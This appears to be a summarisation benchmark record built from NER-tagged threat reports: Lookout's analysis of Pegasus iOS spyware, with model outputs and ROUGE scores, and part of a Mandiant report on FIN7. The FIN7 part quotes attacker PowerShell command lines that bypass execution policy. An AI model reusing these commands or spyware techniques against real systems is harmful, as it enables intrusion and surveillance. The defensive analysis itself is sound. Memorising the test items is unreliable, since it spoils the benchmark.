potentially in order to determine the bandwidth and ability to send full data across the network:6 url [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | 16Stealth [ORG] Update [ORG] to [ORG] Command [ORG] & [ORG] Control [ORG] Infrastructure The software has multiple stealth communication channels . The systemd binary that Pegasus employs appears to use SMS messaging as a communication channel . This functionality has been carefully implemented with instructions delivered via SMS masquerading as [CARDINAL] two - factor authentication messages from popular services such as Facebook , [ORG] Google , and Ever- note . These instructions mirror the structure and expected content of legitimate [CARDINAL] two - factor authentication messages iden- tically . An example of an attacker - provided instruction via SMS ( captured originally by [PERSON] Citizen [PERSON] Lab ) can be seen below . Despite appearing as a legitimate password reset from [ORG] Google , this message actually contains an instruction for Pegasus to update the command and control servers that it can communicate to . It appears Pegasus is capable of receiving [CARDINAL] five types of instructions via SMS , with the instruction ID determined based on the last number of the verification code . For example , in the message above this is [CARDINAL] 9.This functionality appears to allow Pegasus to be updated out of band if http or https was not available . In the event C2 infrastructure was taken down or unavailable , this functionality provides Pegasus with a lifeline to the actors controlling it with instructions on where to find the new [CARDINAL] C2 servers . This functionality is unprecedented in spyware and provides the ability for Pegasus to persist even when infrastructure is compromised or taken down . TECHNICAL ANALYSIS OF PEGASUS SPYWARE | [CARDINAL] 17The various message texts are below : Self Destruction The Pegasus software has a highly sensitive self - destruct mechanism to ensure that the product is not discovered . When the software appears to be threatened , it will self destruct , removing its persistence mechanism ( removing the cloned rtbuddyd and exploit com.apple.itunesstored.2.csstore described above).TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 18Pegasus will also remove all of its libraries ( for example , the audio recording tools):Data Gathering As Pegasus \u2019 fundamental purpose is to spy on the owner of the phone , one of its main operations is to gather data . The data- gathering functionality of Pegasus is among the most complete and comprehensive we have seen in any spy- ware package . It gathers everything from obvious high - value data like passwords , contacts , and calendar entries to data from numerous social networks . The full list of data types gathered is long , so we will examine only how it grabs certain pieces of high- value data in order to show how the product works . The full list of apps is : SMS / iMessageViber - calls and messages Facebook - address book and [PERSON] messages\u2022 \u2022 Gmail - mail and attachments \u2022 [ORG] WhatsApp - messages and calls As high - value [ORG] PII , the \u201c systemd \u201d process grabs each [ORG] VCAL file from the calendar and sends it through a message : TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 19Contacts The software also gathers contacts from the system , dumping the victim \u2019s entire address book . GPS location Pegasus also constantly updates and sends the location of the phone : TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 20Capturing User Passwords One of the most significant sets of private data on a phone is stored in the various user keychains . [ORG] Apple \u2019s [ORG] KeyChain holds all of a user \u2019s stored authentication info ( usernames and passwords ) . Pegasus \u2019 \u201c systemd \u201d process loads the keychain and dumps all of the victim \u2019s data . [PERSON] WiFi and [PERSON] Router [PERSON] Passwords In addition to stealing all of the victim \u2019s passwords , Pegasus interrogates the list of every Wi [LOC] - Fi network that the phone has saved and grabs all of the SSIDs and [ORG] WEP / [ORG] WAP keys and users . Pegasus also grabs the router password for [ORG] Apple devices like [PRODUCT] Airport , [PERSON] Time [PERSON] Capsule , etc . [ORG] TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | 22Interception of Calls and Messages Pegasus has a sophisticated set of audio and messaging intercept libraries that are modular and extensible . The base libraries for audio ( libaudio.dylib ) and messaging ( libimo.dylib ) are comprehensive , but there are specialized libraries for each of the key intercept protocols . The libaudio library registers a number of notification observers that record audio when fired . These observers listen for notification IDs that get posted by various Pegasus modules . In the analyzed sample , this included notifications from the [ORG] WhatsApp and [PRODUCT] Viber modules ( , libwacalls.dylib and [ORG] libvbcalls.dylib).Normal [ORG] PhonePegasus [ORG] Infected [ORG] PhoneTECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | 23The libaudio library registers a number of notification observers that record audio when fired . These observers listen for notification IDs that get posted by various Pegasus modules . In the analyzed sample , this included notifications from the [ORG] WhatsApp and [PRODUCT] Viber modules ( , libwacalls.dylib and libvbcalls.dylib).Process Injection : converter The interception of real - time calls from the chat messengers ( e.g. , [ORG] WhatsApp , [PERSON] Viber ) comes through a library that is inject- ed into their process space dynamically at run time . The \u201c converter \u201d binary ( the mechanism through which this occurs ) is a version of the cynject open - source library available here : url library takes a pid as an argument and injects a dylib into running process using [LOC] Mach kernel APIs . The usage for converter is : start ( usage : % s < pid > < dylib > [ args ] ) Converter has the following entitlements : < key > com.apple.springboard.debugapplications</key > < true/ > < key > get - task - allow</key > < true/ > < key > task_for_pid - allow</key > < true/>Additionally , converter has a failsafe key combination that it listens for on the keyboard to dynamically unload the injected libraries . [ORG] Skype [ORG] Pegasus pulls all of the data about calls out of the [ORG] Skype database on the device . [ORG] TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 24Pegasus also saves any calls that [ORG] Skype has previously recorded by reading them out of the [ORG] Skype database files . [ORG] TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [DATE] 25TelegramWhatsApp The Pegasus authors have instrumented the interception of [ORG] WhatsApp messages and calls within the samples that we have ob- tained . In addition to logging the appropriate information for messages and calls , the software also loads a library ( libwacalls . dylib ) that is designed to hook key [ORG] WhatsApp functions and intercept various communication types . This library issues system - wide notifications when calls are connected , interrupted , or ended , and when another call event occurs . Any application can receive these events provided they know the ID of the notification . Throughout Pegasus these notifications are unique and conspicuous , and they are made up of a sequence that \u2019s 56 characters long and appears to be the output of a sha224 hash function . Another Pegasus module responsible for recording audio included notification observers that explicitly listen for these IDs . It seems that when these notifications are sent from libwacalls , and consequently handled by libaudio.dylib , Pegasus records the current [ORG] WhatsApp call a victim is making . Libaudio saves audio recordings from [ORG] WhatsApp calls in the following directories:\u2022 micFileName - /private / var / tmp / cr / x.<call_id>.caf \u2022 spkFileName - /private / var / tmp / cr / t.<call_id>.caf sentryFileName - /private / var / tmp / cr / z.<call_id>.caf \u2022TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 26TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | 27libwacalls [ORDINAL] first checks that [FAC] Cydia [FAC] Mobile substrate exists by attempting to load and link /usr / lib / libdata.dylib . If it is n\u2019t present then libwacalls exits . Otherwise execution continues , resulting in the decryption of several strings that are used to identify class- es and methods to be hooked . [PERSON] Libwacalls is responsible for hooking the following methods that belong to the CallManager class:\u2022 setCallConnected \u2022 endCallThe following method is also hooked that belongs to the [ORG] CallLogger class:\u2022 addCallEventAll hooks rely on distributed notifications for [ORG] IPC . As a result all hooks post a system - wide notification , with each notification containing a unique identifier that notification observers must reference exactly in order to receive . In all cases notification IDs are [CARDINAL] 56 characters , likely a sha224 hash digest . The functionality of these hooks is as follows : Hook methodInformation included in [ORG] NotificationNotification [ORG] IDsTECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 28Viber The samples of Pegasus we obtained were configured to obtain all of the calls from [LANGUAGE] Viber through the libvbcalls library , which provides hooks for [PERSON] Viber . These hooks are implemented similar to the ways seen in the libwacalls dynamic library , where hook- ing of key [ORG] WhatsApp functions occur . Hooking in libvbcalls takes place when calls are first started and when they finish . [ORG] CallEnded hooking logs the time the call finished and posts it in a system wide notification . The following notification IDs are posted by [ORG] libvbcalls:\u2022 except for the sentryFileName . All [CARDINAL] three paths are listed below.\u2022 micFileName - /private / var / tmp / cr / x.<call_id>.caf spkFileName - /private / var / tmp / cr / t.<call_id>.caf sentryFileName - /private / var / tmp / cr / vb.<call_id>.cafReal - Time Espionage In addition to the ability to grab all the input and output of the phone , the phone can be used as an audio and video recorder . As Omri Lavie , [ORG] NSO \u2019s co - founder , told [ORG] the [ORG] Financial [ORG] Times , \u201c Your smartphone today is the new walkie - talkie . \u201d7 These functions are on display below:7 url [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | 29TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 30ConclusionWe rely on mobile devices to both store our digital assets and give us access to them . Our phones are always with us and have become a main form of voice , video- and messaging - based communication . This makes our mobile devices highly valuable targets for motivated attackers . [ORG] NSO [ORG] Group reportedly has [CARDINAL] hundreds of employees and makes [MONEY] millions [MONEY] of [MONEY] dollars in [DATE] annual revenue , effectively as a cyber arms dealer , from the sale of its sophisticated mobile attack software . [ORG] NSO is [CARDINAL] only [CARDINAL] one example of this type of cyber mercenary : we know that it is not the only one , as we \u2019ve seen with [ORG] the [ORG] Hacking [ORG] Team , [PERSON] Finfisher , and other organizations that compete in this space . While this report is focused on the iOS version of the software , Lookout and [PERSON] Citizen [PERSON] Lab are aware that [ORG] NSO [ORG] Group advertises [ORG] Android and [PERSON] Blackberry versions and are investigating those as well . This report shows the importance of keeping our devices up to date with the latest patches and exercising vigilance with the security of our mobile devices . [ORG] TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 31Appendix A : TLS Certificate Information File : ca.crtCertificate : Data : Version : [CARDINAL] 1 ( 0x0 ) Serial Number : a9 : c2 : dc:41:57 : dc:50:14 Signature Algorithm : sha256WithRSAEncryption Issuer : CN = Asterisk Private CA , O = My Super Company Validity Not Before : Jul [CARDINAL] 18 11:21:53 [DATE] 2016 GMT Not After : Jul [CARDINAL] 17 11:21:53 [DATE] 2021 GMT Subject : CN = Asterisk Private CA , O = My Super Company Subject Public Key Info : Public Key Algorithm : rsaEncryption RSA Public Key : ( 4096 bit ) Modulus ( 4096 bit ): [CARDINAL] 00 : b0:8e:1b:24:7e : b4 : d6:10 : ab:10 : fd : ce : a1 : eb : [CARDINAL] 2d : d7 : c8:38 : d3 : ce : bb : a3:9a:30:0e:72:08:46:01 : [CARDINAL] 2d : c5:3e:3e:82 : [PERSON] c1:4a:4e : a7:44 : d8:94:2b:30:0c : dd : c3 : b3:6b : bf:69 : d2:0d:01:6c : e1 : c5 : db : f0:7c : [CARDINAL] 50:3b : ba : cc:47:64:63:67 : bf:50:62:49:33:74 : d1 : c4:57 : e8:57:2b:6c:4b : b5:63:81:66:7b : cf:0e : c2 : 92:80 : f9 : ce : d9 : e9 : f5 : f2:95:18:77 : d7:24:47:62 : ff:2d : bc:09 : fa : f4:4d:92:53 : df:85 : cc:38:39:9f:14 : ef:16 : f1:6d:63:47 : c9:44:1e:6a:0a:70:00 : bd : [CARDINAL] 92 : a5 : c2 : ec : d1:8d:02 : bf : ae : cb:8b:5e:03:8a:67 : d0 : ee:02:80 : b7 : a7:94:9f : b5:0f : dc:3a : d6 : ea : ec : 3d:8d:3e : ae : e9:54 : f1:39 : a4 : fc:53:01 : ad : ce:6a : e6:56:53 : fe:7d:92:0f:5c:0b:0a:03:18:94 : aa:4e : fc:8d : f0:69 : ee : a2 : c1 : a9:0c:6d:1e:69:78:28:73 : [CARDINAL] 69 : e4 : aa : ca : b0:0f:49 : d9 : ca : b2:71:72 : d9:25 : ec : [CARDINAL] 3e:6c : c0:10:68 : aa : a3 : b6:71 : fd:69 : f3 : d0:4e : c2 : [CARDINAL] 24:3f:69:1f:5a:5d:5e:02:8f:67 : e7:40:52:1f:34 : [CARDINAL] 17:7a:47 : c8:6e : d1 : fc : d2:99:6a:97 : c5:1b : c1:87 : [CARDINAL] 2a:4f:04 : f7:7a:33 : dc:3a : d0 : be:5e:67:26 : b7 : d1 : [CARDINAL] 4e:0e : fa : d4:78:44 : ef : e1 : a2 : a5 : fa : f3 : ae : e4:9b : [CARDINAL] 5f:34 : a5:9b:45 : b0 : dc : ca : a0:19:94:6f : c3 : c1:0a : 79:84:35 : a3 : ad:2d:33:82:28:8a : e2:97 : f1:82:2c : 49:80 : ef : ae:10 : d4 : cf:83 : ed : b3:0c:58 : e8:1c:74 : [CARDINAL] 7d:12:30 : e6 : bc : fb:08 : b7:04:44:51:5e:95:4d:17 : d3 : e7:8e : ab:93:88:7f:7f:91:01 : c9 : d4:61:15:8b : [CARDINAL] 6f:23:41:49:58 : e4 : bd:81 : d9:90:07:8a : c0:99 : da : [CARDINAL] 2f : f0:21 : f1:96:52:7e : a5:5e:69:3d:1a : da : b0:19 : 24:7e : d6:5a:98 : b6:4a:18:54:1f : b9 : e5 : ed:63 : d5 : e6:6d:1c:67:59:91:52:14:55 : aa:94:86 : b1:77:43 : fe : b4:5c : d6:8b:57 : e1 : cf : de:84:37:4f:7a:26:0b : [CARDINAL] 92 : ec : c1:3c:9c:45:31 : b9 : b6 : ad : ef:4e:51:73:53 : 96:06:16:9d : e8:67 : d1:8e:08 : aa:1a:93:0f:7e : fc : [CARDINAL] 8a : f0:9d : ed:13 : db : dd : ab:78:5e:32:99 : ac:41 : b6 : [TIME] 09:75 : a8:9c : ff:6e:72:95:44 : e8 : dc:38:30 : e3:21 : [CARDINAL] 81:0b : bfExponent : [DATE] 65537 ( 0x10001)Signature Algorithm : sha256WithRSAEncryption 7e : ce:86:7c:1d : d7:10 : b6:67:11 : a0:1a : be:01:34 : b8:12 : f5 : [CARDINAL] 61:2a : af : a6:30:94 : dd:35:6f : fb:80 : aa:4d : a1:80:9b:80:63 : d7:02:71:8d:07:4f:57:94:03 : bd:1c : b8:44:83:08:6b : be:72 : [CARDINAL] 47 : e4 : bc : d7:51 : ce : ee:3f:30:84 : d9 : eb:41:3d:7f:9c:6b:37 : [CARDINAL] 58 : d2:94:71 : be:38 : dc:97 : fb:0e:60:2b : d1:88 : e4:72:74:6f : [CARDINAL] 85:3a:60:84 : f1:58:40:2c:9d:5e : f7 : a9:4b:3e : aa:6a : ed:08 : d8:4c : d1:33:1f:5d : ff : b9:6e:98:9f:71:6b:19:50:6d : c3:58 : dd:15:76 : e3 : d9:80 : df : da : c3:55:11 : f6 : cb:6a:08:64 : c1:8d : f9 : f6 : d3 : c3:30:61 : bd:55:4f:34:88:96:0c : [ORG] ea:96:6a:37:14 : b0 : f2:8f:5e:16 : fa : [PERSON] ca:9a:28:7c:68 : e1:6f:07 : f3 : a1:7d : a4 : a4:40:5c : c6 : e9 : ce:98 : a2:95 : b2:09:93 : ba : b5 : a3:62:38:7d : d3:9f:1d:36:2d:29:4a : c6:96 : a8 : d1:2d : de : a9:2a:8b:43:33 : d5 : f1 : a5:71:10:32:33 : a0 : fa:8b:4e:04 : d4:12:4f:26:1f : d8 : [TIME] 82:27 : cc : c2 : a9:17 : a7:65:3d:3c:45:42:77:5a : c0:10:6e:57 : d2:84:89:45 : bc:49:5f : be:0d : cc : ec:21:6c:06:16 : f1:43:8f : [CARDINAL] 58 : ce:93:68:7e:46 : ea : fd : db : e0:9b:42:44:52:66 : f8:01 : d7 : [CARDINAL] 29:7a:61 : b6 : be:13:94:48:02 : bc:68:34:46:73:91:64:76:95 : 14:08 : ba:9e:41:59:76:83 : ab:88 : c3:60:74:75:37:34:08:24 : [CARDINAL] 91:2f : ba:81:65 : [CARDINAL] d3 : b8 : a8 : b4:28:79:71 : [PERSON] ad:7c:95 : db:7e:9c : [CARDINAL] 6b:30:44:3a : b6 : b1:66:83 : ab:1c : a5:77 : f7:63 : d1 : da:30 : a0 : [CARDINAL] 2e:65 : d4:0c : c4 : ec:8d : d3:4c:32 : e8:71 : e5:25:2b:81:97 : cc : ad : c9 : f2 : d9:7d:01:48:10:7c:86:51 : db:39 : da : f3:64:0a:1d : b2:35 : d8:21:2e:27:7c : c7 : b3:8f:28:14:95:90:5c:17:1f:7b : [CARDINAL] 7c : a2 : [CARDINAL] e8:18:4a:31:39:89 : dc:8b:56:99 : df : d0:26:0a:85:70 : e8 : e1 : d0 : ad:59:92:35:98 : a5:7d:4f:51:46:2a:3a : cf:85:79 : [CARDINAL] 5d:07:63:44:6c : a4:81:82 : d8 : d5:40:32:95 : ac : d8:77 : c3 : af : [CARDINAL] 8b : fc : ad:2b : ef:04:87:80:0c : dd : c0 : [PERSON] ec:87:2d:1f:06:51:8f : da:71:1b : f6 : c4:17:5a:6f : e6 : f2 : b2 : d4:90 : b9:76 : a7 : e8:71 : [CARDINAL] 56:30:33:4f:58:15 : b6:2bAppendix B : IOCs for Jailbreak Detection Indicators of Compromise for the jailbreaks used in Pegasus/--early - boot /var / root / test.app /private / var / tmp / crw /private / var / tmp / cr /private / var / tmp / st_dataAuthorsMax [PERSON] Bazaliy , Lookout [PERSON] Michael [PERSON] Flossman , Lookout [PERSON] Andrew [PERSON] Blaich , [PERSON] LookoutSeth [PERSON] Hardy , [PERSON] Lookout [PERSON] Kristy [PERSON] Edwards , Lookout [PERSON] Mike [PERSON] Murray , [ORG] LookoutAdditional credit goes to the other researchers who have worked on this analysis : From Lookout : [PERSON] Christina [PERSON] Olson , [PERSON] Christoph [PERSON] Hebeisen , [PERSON] Pat [PERSON] Ford , [PERSON] Colin [PERSON] Streicher , [PERSON] Robert [PERSON] Nickle , [PERSON] John [PERSON] RoarkFrom Citizen Lab : [PERSON] Bill [PERSON] Marczak , [PERSON] John [PERSON] Scott RailtonWebsite : www.lookout.com [PERSON] Blog : blog.lookout.com Twitter : @lookoutAbout Lookout : Lookout is a cybersecurity company that makes it possible for individuals and enterprises to be both mobile and secure . With [CARDINAL] 100 [CARDINAL] million mobile sensors fueling a dataset of virtually all the mobile code in the world , the Lookout Security Cloud can identify connections that would otherwise go unseen - predicting and stopping mobile attacks before they do harm . The world \u2019s leading mobile network operators , including [ORG] AT&T , [PERSON] Deutsche [PERSON] Telekom , EE , KDDI , Orange , [ORG] Sprint , T [ORG] - [ORG] Mobile and [NORP] Telstra , have selected Lookout as its preferred mobile security solution . Lookout is also partnered with such enterprise leaders as [ORG] AirWatch , [ORG] Ingram [ORG] Micro and [ORG] MobileIron . Headquartered in [GPE] San [GPE] Francisco , Lookout has offices in [GPE] Amsterdam , [GPE] Boston , [GPE] London , [GPE] Sydney , [GPE] Tokyo , [GPE] Toronto and [GPE] Washington , [ORG] D.C.TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 35", "generated_text": "an investigation; a targeted espionage attack; Pegasus; mobile users; the world; OneDrive; the malware; zero-day vulnerabilities; Safari Webkit; memory corruption; the attacker; a mobile user; a phishing message; a link; Android; Blackberry; the user; Calls and Messages; a developer; the malware; Files; Control; IP; a tool; commands; commands; code obfuscation; encryption; the trojan; screenshots; the device; memory; the system; espionage software; phishing emails; Telegram; the system; command and control infrastructure; the attacker; a dedicated server; control; server; payloads; the app; the device; the user; a password; its encryption; the software; the mobile user; a tool; a list; the response; the attacker; details; the application; developers; the user; server; the attacker; the device; the malware; the user; the attacker.", "ref_text": "<START-1>The document provides a technical analysis of the Pegasus spyware created by NSO Group. Pegasus is a sophisticated mobile attack toolkit that can infect iOS and Android devices. It utilizes three zero-day exploits collectively called Trident to jailbreak devices and install the spyware persistently. The exploits target vulnerabilities in Safari Webkit (CVE-2016-4655), the iOS kernel (CVE-2016-4656, CVE-2016-4657), and a developer tool called jsc. Once installed, Pegasus can exfiltrate messages, calls, emails, logs from apps like Gmail, Facebook, Skype, Telegram, and WhatsApp. It can capture passwords, WiFi credentials, router passwords, GPS location, contacts, and calendar data. The spyware hooks into apps to spy on communications before encryption is applied. Pegasus uses advanced obfuscation, encryption, and stealth techniques to avoid detection. It monitors the device state and can self-destruct if it detects threats to its existence. The software is professionally developed with clean, modular code. The report concludes Pegasus is one of the most sophisticated mobile spyware encountered given its evasion abilities, modules for exfiltrating data, and real-time monitoring/recording of users. Defenders should block associated command and control infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4715909090909091, "gpt3/lexical/rouge_rouge2": 0.08, "gpt3/lexical/rouge_rougeL": 0.20454545454545456, "gpt3/lexical/rouge_rougeLsum": 0.20454545454545456, "gpt3_generated_text": ["This article is an investigation into a targeted espionage attack known as Pegasus spyware, which is actively being used against mobile users worldwide. The malware, developed by NSO Group, utilizes zero-day vulnerabilities, code obfuscation, and encryption to subvert security measures in various voice and messaging applications. It steals personal information, contact lists, GPS location, and passwords stored on the device. The iOS version of the attack, known as Trident, exploits three zero-day vulnerabilities in Apple's iOS. The malware has been in existence for over two years and is highly configurable, allowing the attacker to remotely access various types of data from targeted apps. The malware is sophisticated and modular, using encryption to evade detection and self-destruct mechanisms to avoid being discovered. The attack begins with a phishing message containing a benign-looking URL that, when clicked, installs the malware on the device without the user's knowledge. Overall, Pegasus spyware is a highly advanced and dangerous tool used for espionage purposes."]}, {"split_name": "test", "sample_id": "test_50", "prompt_text": "Extract the keywords: www.mandiant.com /resources / evolution - of - fin7 [PRODUCT] FIN7 [PRODUCT] Power [PRODUCT] Hour : [ORG] Adversary [ORG] Archaeology and [ORG] the [ORG] Evolution [ORG] of [ORG] FIN7Recent public research asserts threat groups sharing overlaps with FIN7 transitioned to targeted ransomware operations involving [ORG] REVIL , DARKSIDE , [ORG] BLACKMATTER , and [ORG] ALPHV ransomware . With the purported shift to ransomware operations , [ORG] Mandiant is publishing our research on the evolution of FIN7 which we have n\u2019t publicly written about since [PERSON] Mahalo [PERSON] FIN7 , published in 2019.This blog post draws on organic research from both historical and recent intrusions that [ORG] Mandiant directly investigated , and describes the process of merging multiple [ORG] UNC groups into FIN7 . This process allowed us to merge [CARDINAL] eight previously suspected [ORG] UNC groups into FIN7 in [DATE] January [DATE] 2022 . We also highlight notable shifts in FIN7 activity over this time , including their use of novel malware , incorporation of new initial access vectors , and likely shift in monetization strategies . FIN7 continued to leverage [ORG] PowerShell throughout their intrusions , including in a new backdoor called POWERPLANT , which FIN7 has continually developed over [DATE] the [DATE] last [DATE] two [DATE] years . We also identified new versions of the BIRDWATCH downloader being developed , which are tracked as [ORG] CROWVIEW and [ORG] FOWLGAZE . FIN7 \u2019s initial access techniques have diversified to include software supply chain compromise and the use of stolen credentials , in addition to their traditional phishing techniques . We also observed FIN7 use POWERPLANT as their [ORDINAL] first stage malware instead of [ORG] LOADOUT and/or [ORG] GRIFFON in newer intrusions . Data theft extortion or ransomware deployment following FIN7 - attributed activity at multiple organizations , as well as technical overlaps , suggests that FIN7 actors have been associated with various ransomware operations over time . Mandiant is also tracking multiple , notable campaigns as separate [ORG] UNC groups that we suspect are FIN7 , including a \u201c BadUSB \u201d campaign leading to [ORG] DICELOADER , and multiple phishing campaigns leveraging cloud marketing platforms leading to [CARDINAL] BIRDWATCH.We first disclosed threat reporting and publicized research on FIN7 in [DATE] 2017 . Since then , we \u2019ve published multiple blog posts on FIN7 operations , with more extensive content available on [ORG] Mandiant [ORG] Advantage . In this blog post , we focus on examining the most recent FIN7 intrusion operations , as well as the attribution methodologies that we used . Threat Attribution Over TimeOur attribution methodology requires multiple layers of overlaps within collected threat data to merge suspected FIN7 [ORG] UNC groups into our core FIN7 cluster . Merge evidence is sourced from analysis of attacker infrastructure , intrusion tradecraft , modus operandi , and how specific code is employed by the groups we research . Rigorous documentation of technical evidence is critical for modern cybercrime attribution , when considering the fluid and opportunistic nature of cybercriminal operations , as well as individual operators \u2019 narrow allegiances to criminal organizations . It is also common for us to observe1/23multiple threat groups engaging in intrusion operations within close temporal proximity , sometimes even using the same access method within [TIME] hours [TIME] or [TIME] minutes of each other . This is especially notable in the ransomware ecosystem , where [ORG] Mandiant has observed individual members shift teams , and teams migrate between affiliate programs commonly adopting different TTPs across intrusions depending on who they are collaborating with or gaining access from at a given time . To date , we suspect [CARDINAL] 17 additional UNCs of being affiliated with FIN7 with varying levels of confidence ; however , those groups have not been formally merged into FIN7 . Those groups \u2019 activity spans as far back as [DATE] 2015 and as recently as late 2021 , across [CARDINAL] 36 separate intrusions . [CARDINAL] Eight previously suspected FIN7 [ORG] UNC groups , active since [DATE] 2020 , have recently been merged into FIN7 , confirming the resilience of actors associated with the threat group.2020 Activity Brief : Heavy on the [ORG] LOADOUTFIN7 was active during [DATE] the [DATE] spring [DATE] and [DATE] summer [DATE] of [DATE] 2020 , conducting phishing campaigns and attempting to distribute [ORG] LOADOUT and [ORG] GRIFFON . During that time , [CARDINAL] five [ORG] UNC groups were created to track various campaigns , which eventually were merged into our new splinter group of FIN7 , following merge analysis later in [DATE] 2021 that expanded our understanding of FIN7 . The impacts of related [ORG] UNC merges for [DATE] 2020 activity added usage of code families [ORG] LOADOUT , [ORG] TAKEOUT and a BIRDWATCH variant into FIN7.Figure [CARDINAL] 1 : FIN7 Activity in 2020 - 2021LOADOUT is an obfuscated [ORG] VBScript - based downloader which harvests extensive information from the infected system . The harvested information is then sent to a command - and - control ( C2 ) server . C2 server responses for [ORG] LOADOUT infections delivered GRIFFON , a [ORG] JavaScript - based downloader which retrieves additional [PRODUCT] JavaScript modules using [ORG] HTTP or [ORG] DNS and executes them in memory.2/23In [DATE] late [DATE] summer [DATE] of [DATE] 2020 , FIN7 capped off [DATE] their [DATE] busy [DATE] year with the [ORDINAL] first observed usage of [NORP] POWERPLANT . POWERPLANT , also referred to as \u201c [WORK_OF_ART] KillACK \u201d , is a [ORG] PowerShell - based backdoor with a breadth of capabilities , initially delivered following a successful [ORG] GRIFFON infection in [DATE] August [DATE] 2020 . Merges involving the usage of POWERPLANT into [DATE] 2021 led us to assess that FIN7 is likely the only operator using POWERPLANT.2021 Activity Brief : A Shift to POWERPLANTWe identified an uptick in FIN7 - suspected [ORG] UNC group activity during [DATE] 2021 across [CARDINAL] five intrusions , beginning in [DATE] April [DATE] of [DATE] 2021 . The uptick led us to initiate a deep - dive research effort into FIN7 . We also observed FIN7 shift their initial access techniques away from using [ORG] LOADOUT , [ORG] GRIFFON or [ORG] CARBANAK in favor of direct deployment of [NORP] POWERPLANT and [ORG] BEACON . Specifically , FIN7 used POWERPLANT in all observed intrusions in [DATE] 2021 . FIN7 also relied on [ORG] BEACON as a secondary mode of access alongside some [NORP] POWERPLANT infections . Throughout [DATE] 2021 we scrutinized a multitude of FIN7 - linked [ORG] UNC groups to our breadth of past FIN7 intelligence holdings , merging multiple threat clusters along the way . Our research revealed a fusion of older FIN7 intrusion tradecraft , and new [PRODUCT] FIN7 malware . [ORG] PowerShell [ORG] Archaeology : FIN7 Habits Die HardThere is no doubt about it , [ORG] PowerShell is [ORG] FIN7 \u2019s love language . FIN7 has implemented malware into its offensive operations using many programming languages ; however , during on - system interactions , [ORG] FIN7 \u2019s preference for boutique [ORG] PowerShell - based loaders and unique [ORG] PowerShell commands is dominant . Our deep dive into prior FIN7 intrusions dating as far back as [DATE] 2019 bubbled up several long - standing patterns of unique [ORG] PowerShell invocations still being used [DATE] today . In the [ORDINAL] first example , command lines , such as in Figure [CARDINAL] 2 and Figure [CARDINAL] 3 , had overall low - global prevalence outside of FIN7 and suspected FIN7 UNCs.cmd.exe /c start % SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -nop -exe bypass -f < REDACTED>/ADMIN$/temp / wO9EBGmDqwdc.ps1Figure [CARDINAL] 2 : FIN7 PowerShell Execution from 2019cmd.exe /c start % SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -nop -exe bypass -f \\\\<REDACTED>\\Admin$\\c5k3fsys.3bp.ps1Figure [CARDINAL] 3 : FIN7 PowerShell Execution from 2021The unique aspect in the Figure [CARDINAL] 2 and Figure [CARDINAL] 3 commands is the distinct parameters -noni -nop -exe bypass -f , for launching scripts located in [ORG] Admin shares and installing Windows services . Since [DATE] 2019 , we have observed FIN7 use command line parameters such as these while interacting with victim systems through backdoor malware such as [ORG] CARBANAK . We have since seen a shift of some of these distinct [ORG] PowerShell commands being initiated through [NORP] POWERPLANT infections . Smaller patterns and consistencies across FIN7 intrusions from [DATE] 2019 and beyond reveal more distinct [ORG] PowerShell command lines using -ex bypass -f or -ex bypass -file as passed parameters . Although those patterns appear modest to hunt for , the combinations have extremely low global prevalence outside of FIN7 - associated threat activity . For example , the [ORDINAL] first command line pattern has been seen over [CARDINAL] 2800 times , all of which were events attributed to FIN7 . The [ORDINAL] second command line pattern has been seen3/23nearly [CARDINAL] 250 separate times at [CARDINAL] 10 different victims as far back as [DATE] 2019 , all of which were FIN7 attributed commands . Figure [CARDINAL] 4 : FIN7 PowerShell Execution from [CARDINAL] 2019powershell.exe -ex bypass -file C:\\windows\\temp\\fdddu32.ps1Figure [CARDINAL] 5 : FIN7 PowerShell Execution from [CARDINAL] 2020powershell.exe -ex bypass -f c:\\users\\public\\temp\\AC - Win10w - x64.ps1 powershell.exe -ex bypass -f C:\\Users\\Public\\Videos\\AC - Bot - x64.ps1Figure 6 : FIN7 PowerShell Executions from [CARDINAL] 2021powershell.exe -ex bypass -f pkit.ps1 powershell.exe -ex bypass -f cube.ps1In addition to [ORG] FIN7 \u2019s unique command lines during intrusion operations , we identified long - standing usage of other [ORG] PowerShell code families , such as POWERTRASH . POWERTRASH is an in - memory dropper , or loader , written in [ORG] PowerShell that executes an embedded payload . Observed payloads loaded by [ORG] FIN7 \u2019s [ORG] POWERTRASH include [ORG] CARBANAK , [ORG] DICELOADER , [ORG] SUPERSOFT , [ORG] BEACON and [GPE] PILLOWMINT . POWERTRASH is a uniquely obfuscated iteration of a shellcode invoker included in the [ORG] PowerSploit framework available on [ORG] GitHub . With this improved understanding of FIN7 intrusion operations , we assembled our analytical efforts to begin merging multiple suspected UNCs into FIN7 . As part of this initiative , we identified new FIN7 missions targeting our customers , including a [ORG] Managed [ORG] Defense [ORG] Rapid [ORG] Response engagement in [DATE] 2021 . Managing a DefenseFIN7 has targeted a broad spectrum of organizations in multiple industries , including [ORG] Software , [ORG] Consulting , [ORG] Financial [ORG] Services , [ORG] Medical Equipment , [ORG] Cloud [ORG] Services , Media , Food and Beverage , Transportation , and 